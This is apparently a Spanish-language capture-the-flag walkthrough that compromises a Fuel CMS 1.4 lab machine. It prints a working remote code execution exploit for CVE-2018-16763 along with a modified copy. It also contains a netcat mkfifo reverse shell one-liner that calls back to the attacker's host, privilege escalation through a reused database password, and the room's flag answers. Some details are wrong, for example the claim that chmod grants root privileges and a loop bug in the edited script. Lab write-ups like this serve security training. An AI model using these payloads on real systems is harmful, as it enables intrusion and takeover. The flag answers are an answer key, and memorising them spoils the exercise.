### Task 1 - Root it!

Iniciamos arrancando la máquina virtual, esperamos a que cargue y nos de nuestra IP, una vez dentro de ella, vamos a obtener los servicios activos con el siguiente comando nmap:

```
nmap -sC - sV -T4 10.201.100.131
```

Al hacerlo, podemos ver que hay un servicio activo en el puerto 80, como se aprecia a continuación:

```shell
PORT   STATE SERVICE
80/tcp open  http
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-title: Welcome to FUEL CMS
```

Por lo que procedemos a colocar en la barra del navegador la siguiente dirección:

```
10.201.100.131
```

Una vez que nos carga la página web que nos dice **Welcome to Fuel CMS**, donde aparentemente no hay mucha información por destacar es la versión de CMS que está corriendo, que es la 1.4.

Sabiendo eso, procedemos a buscar un exploit para el servicio que esta usando el servidor, encontrando en *Exploit Database*, por lo que procedemos a descargarlo, encontrando lo siguiente:

```python
# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)

# Date: 2019-07-19

# Exploit Author: 0xd0ff9

# Vendor Homepage: https://www.getfuelcms.com/

# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1

# Version: <= 1.4.1

# Tested on: Ubuntu - Apache2 - php5

# CVE : CVE-2018-16763

import requests

import urllib

url = "http://127.0.0.1:8881"

def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
    xxxx = raw_input('cmd:')
    burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
    proxy = {"http":"http://127.0.0.1:8080"}
    r = requests.get(burp0_url, proxies=proxy)
    html = "<!DOCTYPE html>"
    htmlcharset = r.text.find(html)
    begin = r.text[0:20]
    dup = find_nth_overlapping(r.text,begin,2)  
    print r.text[0:dup]
```

Antes de emplearlo, procedemos a realizar las modificaciones necesarias para que funcione, quedando de la siguiente manera:

```python
# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)

# Date: 2019-07-19

# Exploit Author: 0xd0ff9

# Vendor Homepage: https://www.getfuelcms.com/

# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1

# Version: <= 1.4.1

# Tested on: Ubuntu - Apache2 - php5

# CVE : CVE-2018-16763

import requests

import urllib

url = "http://10.201.100.131"

def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
    xxxx = raw_input('cmd:')
    url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
    r = requests.get(url)
    html = "<!DOCTYPE html>"
    htmlcharset = r.text.find(html)
    begin = r.text[0:20]
    dup = find_nth_overlapping(r.text,begin,2)  
    print r.text[0:dup]
```

Una vez que ya fue adaptado el exploit, procedemos a darle privilegios root con **chmod +x 47138.py**, una vez realizado esto procedemos a ejecutarlo, donde se va a quedar a la espera de lo que hagamos.

```shell
root@ip-10-201-117-25:~/Downloads# python2 47138.py 
cmd:
```

Ahora procedemos a buscar ahora un generador de reverse shell, encontrando la página Reverse Shell Generator (https://www.revshells.com/), donde se configura el tipo de reverse shell *nc mkfifo*, y una vez que lo configuramos resulta en lo siguiente:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.201.117.25 1234 >/tmp/f
```

Abrimos una nueva ventana del terminal y procedemos a ejecutar el listener con el siguiente comando: **nc -lvnp 1234**.

```shell
root@ip-10-201-117-25:~/Downloads# nc -lvnp 1234
listening on [any] 1234 ...

```

Ahora si procedemos a colocar el reverse shell donde se había quedado a la espera la primer ventana

```shell
root@ip-10-201-117-25:~/Downloads# python2 47138.py
cmd: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.201.117.25 1234 >/tmp/f

```

Como podemos apreciar, ya se logró la conexión, ya que se muestra esto en la ventana donde corrimos el listener:

```shell
root@ip-10-201-117-25:~/Downloads# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.201.117.25] from (UNKNOWN) [10.201.100.131] 50774
sh: 0: can't access tty; job control turned off
$
```

Una vez que se logro la conexión, procedemos a configurar el terminal para que funcione de forma correcta, todo esto se puede apreciar a continuación:

```shell
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/var/www/html$ export TERM=xterm
export TERM=xterm
www-data@ubuntu:/var/www/html$ 
```

Por lo que ahora ya podemos utilizar el shell para explorar la máquina, procediendo entonces a cambiarnos al directorio home yrevisar con **ls** el contenido de dicho directorio:

```shell
www-data@ubuntu:/var/www/html$ cd /home/
www-data@ubuntu:/home$ ls
www-data
```

Ingresamos a ese directorio y procedemos a revisar el contenido de este nuevo directorio:

```shell
www-data@ubuntu:/home$ cd www-data/
www-data@ubuntu:/home/www-data$ ls
flag.txt
```

Procedemos a revisar el contenido de este archivo txt con el comando **cat**:

```shell
www-data@ubuntu:/home/www-data$ cat flag.txt
6470e394cbf6dab6a91682cc8585059b
```

Obteniendo así la respuesta a la primer pregunta, por lo que ahora procedemos a revisar los demás directorios disponibles:

```shell
www-data@ubuntu:/home/www-data$ cd var/www/html/fuel/aplication/
www-data@ubuntu:/var/www/html/fuel/aplication/$ ls
cache  controllers  helpers  index.html   libraries
migrations  third_party  config  core  hooks
language  logs  models  views
```

Después de estar revisando la mayoría de los directorios, en el caso de *config*, encontramos un archivo php denominado como database.php, al ver su contenido, se muestra lo siguiente:

```
$db['default'] = array(
		'dns'   => '',
		'hostname' => 'localhost',
		'username' => 'root',
		'password' => 'mememe',
		'database' => 'fuel_schema',
		'dbdriver' => 'mysqli',
		'dbprefix' => '',
		'pconnect' => FALSE,
		'db_debug' => (ENVIRONMENT !== 'production'),
		'cache_on' => FALSE,
		'cachedir' => '',
		'char_set' => 'utf8',
		'dbcollat' => 'utf8_general_ci',
		'swap_pre' => '',
		'encrypt' => FALSE,
		'compress' => FALSE,
		'stricton' => FALSE,
		'failover' => array(),
		'save_queries' => TRUE
);

//used for testing purposes
if (defined('TESTING'))
{
		@include(TESTER_PATH.'config/tester_database'.EXIT);
}
```

Por lo que ahora que tenemos el usuario y contraseña, probamos cambiarnos a usuario root e ingresamos la contraseña:

```shell
www-data@ubuntu:/var/www/html/fuel/aplication/config$ su root
Password:
root@ubuntu:/var/www/html/fuel/aplication/config#
```

Ahora con este nivel, nos cambiamos al directorio raíz y revisamos su contenido:

```shell
root@ubuntu:/var/www/html/fuel/aplication/config# cd /root/
root@ubuntu:~# ls
root.txt
```

Por último nos resta revisar el contenido de ese archivo con el comando **cat**:

```shell
root@ubuntu:~# cat root.txt
b9bbcb33e11b80be759c4e844862482d
```

Ahora con esto, podemos pasar a resolver las preguntas de este room.
#### Pregunta 1:

Nos pide el contenido de **User.txt**

Respuesta:

```respuesta
6470e394cbf6dab6a91682cc8585059b
```
#### Pregunta 2:

Nos pide el contenido de **Root.txt**

Respuesta:

```respuesta
b9bbcb33e11b80be759c4e844862482d
```